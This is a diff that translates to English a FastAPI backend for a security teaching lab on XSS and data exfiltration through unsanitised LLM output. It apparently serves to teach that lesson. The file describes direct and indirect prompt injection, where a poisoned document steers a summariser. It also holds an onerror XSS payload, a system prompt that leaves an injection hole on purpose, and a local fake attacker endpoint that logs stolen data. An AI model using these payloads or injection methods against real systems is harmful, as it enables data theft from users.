@@ -1,16 +1,17 @@
 """
-AIパート: 「LLMの出力をそのまま画面に出す」XSSを体験するためのバックエンド。
+AI part: a backend for experiencing XSS caused by "rendering an LLM's output directly."
 
-設計の芯:
-- LLMの出力は "信頼できない入力" の一種。コメントと全く同じ扱いが必要。
-- ここ(バックエンド)は Gemini を呼んでテキストを返すだけ。XSSは例によってフロントの描画で起きる。
+Core design:
+- An LLM's output is a kind of "untrusted input." It needs the exact same treatment as a comment.
+- This backend just calls Gemini and returns text. The XSS, as always, happens in the frontend render.
 
-Gemini まわりの作り(ご要望対応):
-- 複数モデルを順に試す「フォールバック」。失敗したら次のモデルへ。
-- 設定したモデル名が全滅したら、ListModels APIで「このキーで実際に使えるモデル」を自動検出して再試行。
-  → モデル名を当てずっぽうで書かなくても動く。
-- 失敗理由(HTTPステータス・本文)は _last_error に記録し、/api/ai/health と応答のnoteで見える化。
-- それでもダメ / キー未設定 なら「モック応答」にフォールバック(当日落ちない保険)。
+Gemini wiring:
+- "Fallback": try several models in order; on failure, move to the next.
+- If all configured models fail, auto-discover the models actually usable with this key via the
+  ListModels API and retry. → You don't have to guess model names.
+- Failure reasons (HTTP status / body) are recorded in _last_error and surfaced via
+  /api/ai/health and the response "note".
+- If that still fails / no key is set, fall back to a "mock response" (a safety net so the demo never dies).
 """
 
 from __future__ import annotations
@@ -27,13 +28,13 @@ router = APIRouter(prefix="/api/ai", tags=["ai"])
 
 BASE = "https://generativelanguage.googleapis.com/v1beta"
 
-# 既定で試すモデル。環境変数 GEMINI_MODELS="a,b,c" で上書き可。
-# ※ここが全滅しても、後述の「自動検出」で実在モデルに切り替わるので神経質にならなくてよい。
-# ※モデルの提供状況はキー/時期で変わる。古いモデル(例 gemini-2.5-*)は新規キーで404になることがある。
-#   実際に使える名前は GET /api/ai/health で確認できる。
+# Models to try by default. Override with the env var GEMINI_MODELS="a,b,c".
+# Even if all of these fail, the "auto-discovery" below switches to a real model, so don't fret.
+# Model availability varies by key/time; older models (e.g. gemini-2.5-*) may 404 for new keys.
+# Check the names actually usable with GET /api/ai/health.
 DEFAULT_MODELS = ["gemini-3.5-flash", "gemini-3-flash-preview", "gemini-flash-latest"]
 
-_last_error: str = ""  # 直近の失敗理由(health / note 表示用)
+_last_error: str = ""  # most recent failure reason (for health / note display)
 
 
 def _api_key() -> str:
@@ -56,13 +57,13 @@ class SummarizeIn(BaseModel):
 
 
 class AiOut(BaseModel):
-    text: str           # LLMの出力(生のmarkdown/テキスト)
-    provider: str       # 実際に応答したモデル名 or "mock"
-    note: str = ""      # フォールバックの説明など(UI表示用)
+    text: str           # the LLM's output (raw markdown/text)
+    provider: str       # the model that actually answered, or "mock"
+    note: str = ""      # explanation of fallback, etc. (for UI display)
 
 
 async def _list_available(client: httpx.AsyncClient, api_key: str) -> list[str]:
-    """このキーで generateContent が使えるモデル名を取得する。"""
+    """Fetch the model names that support generateContent for this key."""
     try:
         r = await client.get(f"{BASE}/models", headers={"x-goog-api-key": api_key})
     except httpx.HTTPError:
@@ -79,7 +80,7 @@ async def _list_available(client: httpx.AsyncClient, api_key: str) -> list[str]:
 async def _generate(
     client: httpx.AsyncClient, api_key: str, model: str, system: str, user: str
 ) -> tuple[str, str] | None:
-    """1モデルで生成。成功で (text, model)。失敗は _last_error に理由を残して None。"""
+    """Generate with one model. On success returns (text, model). On failure records the reason in _last_error and returns None."""
     global _last_error
     body = {
         "systemInstruction": {"parts": [{"text": system}]},
@@ -93,7 +94,7 @@ async def _generate(
             json=body,
         )
     except httpx.HTTPError as e:
-        _last_error = f"{model}: ネットワークエラー ({e!r})"
+        _last_error = f"{model}: network error ({e!r})"
         return None
     if r.status_code != 200:
         _last_error = f"{model}: HTTP {r.status_code} {r.text[:300]}"
@@ -102,11 +103,11 @@ async def _generate(
     try:
         text = data["candidates"][0]["content"]["parts"][0]["text"]
     except (KeyError, IndexError):
-        # 候補なし = 安全フィルタでブロック等。理由を残す。
-        _last_error = f"{model}: 候補なし {str(data)[:300]}"
+        # No candidate = blocked by the safety filter, etc. Record the reason.
+        _last_error = f"{model}: no candidate {str(data)[:300]}"
         return None
     if not text:
-        _last_error = f"{model}: 空応答"
+        _last_error = f"{model}: empty response"
         return None
     return text, model
 
@@ -119,13 +120,13 @@ async def _call_gemini(system: str, user: str) -> tuple[str, str] | None:
     _last_error = ""
     async with httpx.AsyncClient(timeout=25) as client:
         tried: list[str] = []
-        # 1) 設定モデルを順に
+        # 1) configured models, in order
         for model in _models():
             tried.append(model)
             res = await _generate(client, api_key, model, system, user)
             if res:
                 return res
-        # 2) 全滅 → 実在モデルを自動検出して再試行(flash優先)
+        # 2) all failed → auto-discover real models and retry (prefer flash)
         available = await _list_available(client, api_key)
         retry = [m for m in available if "flash" in m and m not in tried]
         retry += [m for m in available if m not in tried and m not in retry]
@@ -134,9 +135,9 @@ async def _call_gemini(system: str, user: str) -> tuple[str, str] | None:
             if res:
                 return res
         if available:
-            _last_error += f" ｜ このキーで使えるモデル: {', '.join(available[:10])}"
+            _last_error += f" | models usable with this key: {', '.join(available[:10])}"
         else:
-            _last_error += " ｜ ListModelsも取得不可(キー/権限/ネットワークを確認)"
+            _last_error += " | ListModels also failed (check key/permissions/network)"
     return None
 
 
@@ -146,11 +147,11 @@ _URL = re.compile(r"https?://[^\s)\]\"'<>]+")
 
 
 def _mock(user: str, kind: Literal["chat", "summarize"]) -> str:
-    """キー無し/全滅時のモック。「compliantなLLM」を演じ、入力から payload を取り出して出力する。
-    - 入力に既にある画像/imgタグ → そのまま通す(間接injectionの忠実再現)
-    - URLだけある → 画像記法に包む
-    - onerror を要求している → onerror付きimgを出す
-    これで、実Geminiが使えない人でも攻撃が確実に再現できる。
+    """Mock for when there's no key / all models fail. Plays a "compliant LLM" and extracts the payload from the input.
+    - an image / img tag already in the input → pass it through (faithful to indirect injection)
+    - only a URL → wrap it as a Markdown image
+    - onerror is requested → emit an img with onerror
+    This way the attack reproduces reliably even for people who can't use the real Gemini.
     """
     payloads = _IMG_MD.findall(user) + _IMG_TAG.findall(user)
     if not payloads:
@@ -159,10 +160,10 @@ def _mock(user: str, kind: Literal["chat", "summarize"]) -> str:
             payloads = [f"![leak]({m.group(0)})"]
         elif "onerror" in user.lower():
             payloads = ["<img src=x onerror=\"alert('XSS')\">"]
-    body = "\n\n".join(payloads) if payloads else "（危険な内容は見つかりませんでした）"
+    body = "\n\n".join(payloads) if payloads else "(no dangerous content found)"
     if kind == "summarize":
-        return "（モック要約）要点:\n\n- サンプル文書です。\n\n" + body
-    return "（モック応答）はい、こちらです:\n\n" + body
+        return "(mock summary) Key points:\n\n- Sample document.\n\n" + body
+    return "(mock response) Sure, here you go:\n\n" + body
 
 
 async def _run(system: str, user: str, kind: Literal["chat", "summarize"]) -> AiOut:
@@ -171,49 +172,50 @@ async def _run(system: str, user: str, kind: Literal["chat", "summarize"]) -> Ai
         text, model = result
         return AiOut(text=text, provider=model)
     if not _api_key():
-        note = "GEMINI_API_KEY 未設定のためモック応答"
+        note = "GEMINI_API_KEY not set → mock response"
     else:
-        note = f"Gemini応答不可→モック: {_last_error}"
+        note = f"Gemini unavailable → mock: {_last_error}"
     return AiOut(text=_mock(user, kind), provider="mock", note=note)
 
 
 @router.post("/chat", response_model=AiOut)
 async def chat(payload: ChatIn) -> AiOut:
-    """(a) 直接インジェクション用。ユーザーの指示でAIに payload を出力させる。"""
+    """(a) For direct injection. The user's instruction makes the AI emit a payload."""
     system = (
-        "あなたは親切なアシスタントです。回答は markdown で、"
-        "必要なら太字・箇条書き・リンク・画像も使って見やすく答えてください。"
+        "You are a helpful assistant. Answer in markdown; use bold, bullet lists, links, "
+        "and images where helpful to make the answer clear."
     )
     return await _run(system, payload.message, "chat")
 
 
 @router.post("/summarize", response_model=AiOut)
 async def summarize(payload: SummarizeIn) -> AiOut:
-    """(b) 間接インジェクション用。外部文書を要約 → 文書内の指示にAIが従ってしまう。
+    """(b) For indirect injection. Summarize an external document → the AI obeys instructions buried in it.
 
-    system prompt は「よくある実装」を再現: 要約結果をそのままWeb表示するため、
-    元文書の画像やリンクは "動作する形で" 残す(コードブロックで囲まない)よう指示している。
-    この"親切さ"こそが、毒入り文書の画像/リンクを通してしまう穴になる。
+    The system prompt reproduces a "common implementation": because the summary is rendered
+    directly as HTML on a web page, it tells the model to keep the original document's images and
+    links in a "working" form (not wrapped in code blocks). That very "helpfulness" is the hole
+    that lets a poisoned document's image/link through.
     """
     system = (
-        "あなたは文書要約アシスタントです。与えられた文書を markdown で簡潔に要約してください。"
-        "出力はそのままWebページに表示されます。元の文書にある画像やリンクは、"
-        "コードブロックで囲まず、実際に表示・動作する形でそのまま残してください。"
+        "You are a document-summarization assistant. Summarize the given document concisely in "
+        "markdown. The output is rendered directly on a web page, so keep any images and links "
+        "from the original document intact and working — do not wrap them in code blocks."
     )
-    user = f"次の文書を要約してください:\n\n---\n{payload.document}\n---"
+    user = f"Summarize the following document:\n\n---\n{payload.document}\n---"
     return await _run(system, user, "summarize")
 
 
 @router.get("/health")
 async def health() -> dict:
-    """Gemini接続の診断。モックに落ちる原因を切り分けるために使う。
-    例: curl http://localhost:8000/api/ai/health
+    """Diagnostics for the Gemini connection. Use it to pin down why it falls back to mock.
+    e.g.: curl http://localhost:8000/api/ai/health
     """
     api_key = _api_key()
     if not api_key:
         return {
             "key_set": False,
-            "hint": "backend/.env に GEMINI_API_KEY=... を設定して uvicorn を再起動",
+            "hint": "Set GEMINI_API_KEY=... in backend/.env and restart uvicorn",
         }
     async with httpx.AsyncClient(timeout=25) as client:
         available = await _list_available(client, api_key)
@@ -223,21 +225,21 @@ async def health() -> dict:
         "available_generateContent_models": available,
         "last_error": _last_error,
         "hint": (
-            "configured_models が available に含まれているか確認。含まれていなければ "
-            ".env に GEMINI_MODELS=<available の名前> を設定(自動検出でも動きます)。"
+            "Check whether configured_models are in 'available'. If not, set "
+            "GEMINI_MODELS=<a name from available> in .env (auto-discovery also works)."
         ),
     }
 
 
 # ---------------------------------------------------------------------------
-# 「攻撃者の受信サーバ」を模したローカルendpoint。
-# markdown画像 ![](/steal?c=...) が描画されるとブラウザが自動でここを取りに来る。
-# → クエリに載った"盗んだデータ"がサーバログと /api/ai/steal-log に残る。
-# これで「JS無しの情報漏洩(exfiltration)」を、外部に一切送らず体験できる。
+# A local endpoint that mimics the "attacker's receiver".
+# When a markdown image ![](/steal?c=...) is rendered, the browser fetches this automatically.
+# → The "stolen data" carried in the query string lands in the server log and /api/ai/steal-log.
+# This lets you experience "exfiltration without any JS" while sending nothing to the outside world.
 # ---------------------------------------------------------------------------
 _stolen: list[dict] = []
 
-# 1x1 透明GIF
+# 1x1 transparent GIF
 _PIXEL = bytes.fromhex(
     "47494638396101000100800000ffffff00000021f90401000000002c00000000"
     "0100010000020144003b"
@@ -248,7 +250,7 @@ _PIXEL = bytes.fromhex(
 async def steal(c: str = "", data: str = "") -> Response:
     payload = c or data or ""
     _stolen.append({"stolen": payload})
-    # Windowsのcp932コンソールでは絵文字/日本語のprintが例外になるので握りつぶす。
+    # On Windows' cp932 console, printing emoji/non-ASCII can raise, so swallow it.
     try:
         print(f"[attacker-server] received: {payload!r}")
     except Exception:
